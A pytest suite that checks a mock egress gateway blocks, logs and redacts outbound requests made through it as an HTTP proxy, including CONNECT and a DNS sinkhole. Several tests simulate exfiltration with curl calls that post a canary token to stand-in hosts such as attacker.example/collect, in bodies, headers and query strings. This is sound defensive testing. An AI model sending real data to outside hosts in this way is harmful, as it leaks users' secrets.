"""The mock gateway logs every egress attempt, in every request form.

Marked `docker`: deselected by default, skipped unless REPROBE_DOCKER_TESTS=1.
Build it first with `make mockgw`.

The plan's version of this test sent origin-form requests with a spoofed Host
header straight at the published port, which exercises a plain HTTP server and
not a proxy at all. It passed while CONNECT was answered with a 404 and every
HTTPS attempt went unlogged. These tests drive the gateway the way a trial
does: through `curl -x`, in all three request forms a forward proxy sees.
"""

import json
import subprocess
import time

import pytest

pytestmark = pytest.mark.docker

IMAGE = "reprobe/mockgw:dev"
PORT = 18080
PROXY = f"http://127.0.0.1:{PORT}"
CANARY = "RPRB_CANARY_" + "A" * 32


def _docker(*args: str) -> subprocess.CompletedProcess[str]:
    return subprocess.run(("docker", *args), capture_output=True, text=True)


def _curl(*args: str) -> subprocess.CompletedProcess[str]:
    # No check=: a refused CONNECT makes curl exit non-zero, and that is the
    # expected outcome. What matters is what the gateway logged.
    return subprocess.run(
        ("curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", *args),
        capture_output=True,
        text=True,
    )


@pytest.fixture
def gateway(tmp_path):
    out = tmp_path / "reprobe"
    out.mkdir()
    started = _docker(
        "run",
        "-d",
        "--rm",
        "-p",
        f"{PORT}:8080",
        "-e",
        "REPROBE_ALLOWLIST=registry.npmjs.org",
        "-e",
        f"REPROBE_REDACT=sk-secret-{'9' * 8}",
        "-v",
        f"{out}:/reprobe",
        IMAGE,
    )
    if started.returncode != 0:
        pytest.fail(f"could not start the gateway:\n{started.stderr}")
    cid = started.stdout.strip()

    try:
        for _ in range(50):
            if _curl("--max-time", "2", PROXY).stdout not in ("", "000"):
                break
            if _docker("inspect", "-f", "{{.State.Running}}", cid).stdout.strip() != "true":
                pytest.fail(f"gateway exited during startup:\n{_docker('logs', cid).stdout}")
            time.sleep(0.2)
        else:
            pytest.fail(f"gateway never became ready:\n{_docker('logs', cid).stdout}")
        yield out, cid
    finally:
        _docker("kill", cid)


def _lines(out) -> list[dict]:
    path = out / "egress.jsonl"
    if not path.exists():
        return []
    return [json.loads(line) for line in path.read_text().splitlines() if line.strip()]


def _last(out) -> dict:
    lines = _lines(out)
    assert lines, "the gateway logged nothing at all"
    return lines[-1]


# --- the three request forms a forward proxy sees --------------------------


def test_absolute_form_through_a_real_proxy_is_blocked_and_logged(gateway):
    # `GET http://host/path HTTP/1.1` -- what HTTP_PROXY actually produces.
    out, _ = gateway
    code = _curl("-x", PROXY, "-d", f"key={CANARY}", "http://attacker.example/collect").stdout
    assert code == "403"
    record = _last(out)
    assert record["host"] == "attacker.example"
    assert record["allowed"] is False
    assert CANARY in record["body_preview"]


def test_connect_for_https_is_logged_with_its_real_target(gateway):
    # The one the plan missed entirely. aiohttp answers CONNECT with 404 unless
    # it is intercepted in middleware, and the target lives in raw_path, not
    # path_qs -- so a naive handler logs an empty host.
    out, _ = gateway
    _curl("--max-time", "5", "-x", PROXY, "https://attacker.example/collect")
    record = _last(out)
    assert record["method"] == "CONNECT"
    assert record["host"] == "attacker.example", "CONNECT logged the wrong host"
    assert record["port"] == 443
    assert record["protocol"] == "connect"
    assert record["allowed"] is False


def test_connect_to_an_allowlisted_host_is_still_refused_but_logged(gateway):
    # R3: nothing leaves the container. An allowlisted host gets a canned HTTP
    # response, never a tunnel -- but the attempt is still evidence.
    out, _ = gateway
    _curl("--max-time", "5", "-x", PROXY, "https://registry.npmjs.org/widget")
    record = _last(out)
    assert record["method"] == "CONNECT"
    assert record["host"] == "registry.npmjs.org"


def test_origin_form_with_a_spoofed_host_is_logged(gateway):
    out, _ = gateway
    code = _curl("-H", "Host: attacker.example", f"{PROXY}/collect").stdout
    assert code == "403"
    assert _last(out)["host"] == "attacker.example"


# --- allowlist behaviour ---------------------------------------------------


def test_allowlisted_request_succeeds_and_is_logged(gateway):
    out, _ = gateway
    body = subprocess.run(
        ("curl", "-s", "-x", PROXY, "http://registry.npmjs.org/widget"),
        capture_output=True,
        text=True,
        check=True,
    ).stdout
    assert json.loads(body)["ok"] is True
    assert _last(out)["allowed"] is True


def test_a_lookalike_host_is_not_allowlisted(gateway):
    # `registry.npmjs.org.attacker.test` contains the allowlisted name as a
    # prefix. A substring check would let it through.
    out, _ = gateway
    code = _curl("-x", PROXY, "http://registry.npmjs.org.attacker.test/x").stdout
    assert code == "403"
    assert _last(out)["allowed"] is False


# --- evidence quality -----------------------------------------------------


def test_headers_are_logged_so_header_exfiltration_is_visible(gateway):
    out, _ = gateway
    _curl("-x", PROXY, "-H", f"X-Data: {CANARY}", "http://collector.example/ping")
    record = _last(out)
    headers = {k.lower(): v for k, v in record["headers"].items()}
    assert headers.get("x-data") == CANARY


def test_a_known_secret_value_is_redacted_everywhere_it_appears(gateway):
    # Redaction is by value, not by header name, so a canary hidden in an
    # Authorization header is still captured while a real credential is not.
    out, _ = gateway
    secret = f"sk-secret-{'9' * 8}"
    _curl(
        "-x",
        PROXY,
        "-H",
        f"Authorization: Bearer {secret}",
        "-H",
        f"X-Data: {CANARY}",
        "-d",
        f"token={secret}",
        "http://attacker.example/collect",
    )
    raw = (out / "egress.jsonl").read_text()
    assert secret not in raw, "a known secret value reached the egress log"
    assert "<redacted>" in raw
    record = _last(out)
    headers = {k.lower(): v for k, v in record["headers"].items()}
    assert headers.get("x-data") == CANARY, "redaction must not swallow canary evidence"


def test_the_query_string_is_logged(gateway):
    out, _ = gateway
    _curl("-x", PROXY, f"http://dns-logger.example/q?v={CANARY}")
    assert CANARY in _last(out)["path"]


def test_every_attempt_is_appended_not_overwritten(gateway):
    out, _ = gateway
    for i in range(3):
        _curl("-x", PROXY, f"http://attacker.example/{i}")
    assert len(_lines(out)) >= 3


# --- the DNS sinkhole -----------------------------------------------------


def test_the_dns_sinkhole_resolves_every_name_to_the_gateway(gateway):
    # The point of the sinkhole: a trial that ignores HTTP_PROXY and dials a
    # hostname directly still lands here and still gets logged. Measured that
    # the plan's approach -- a file in /etc/dnsmasq.d -- silently resolved
    # nothing, because Debian ships every conf-dir line commented out.
    _, cid = gateway
    probe = (
        'echo "nameserver 127.0.0.1" > /etc/resolv.conf; '
        "getent hosts anything.whatever.test | awk '{print $1}'; "
        "getent hosts attacker.example | awk '{print $1}'"
    )
    resolved = _docker("exec", cid, "sh", "-lc", probe).stdout.split()
    own_ip = _docker("exec", cid, "sh", "-lc", "hostname -i | awk '{print $1}'").stdout.strip()
    assert own_ip, "could not determine the gateway's own address"
    assert resolved == [own_ip, own_ip], f"sinkhole resolved {resolved!r}, expected the gateway"


def test_the_gateway_refuses_to_start_without_a_sinkhole(tmp_path):
    # A backgrounded dnsmasq that dies would leave the gateway serving HTTP
    # with no sinkhole, so a direct-hostname dial would fail to resolve rather
    # than be logged -- a missing observation that reads as a clean trial.
    # Occupying port 53 makes dnsmasq exit immediately.
    blocked = _docker(
        "run",
        "--rm",
        "--entrypoint",
        "sh",
        IMAGE,
        "-lc",
        "dnsmasq --keep-in-foreground --address=/#/127.0.0.1 & sleep 1; exec /opt/start.sh",
    )
    assert blocked.returncode != 0
    assert "sinkhole is not up" in blocked.stdout + blocked.stderr


def test_a_canary_at_the_end_of_a_large_body_is_captured(gateway):
    # Guards the readexactly body read: read() returns on the first segment, so
    # a canary near the end of a multi-KB body could be truncated out of the
    # preview and canary_exfil would miss it.
    out, _ = gateway
    padding = "x" * 3000
    body = f"{padding}&secret={CANARY}"
    _curl("-x", PROXY, "-d", body, "http://attacker.example/collect")
    assert CANARY in _last(out)["body_preview"]
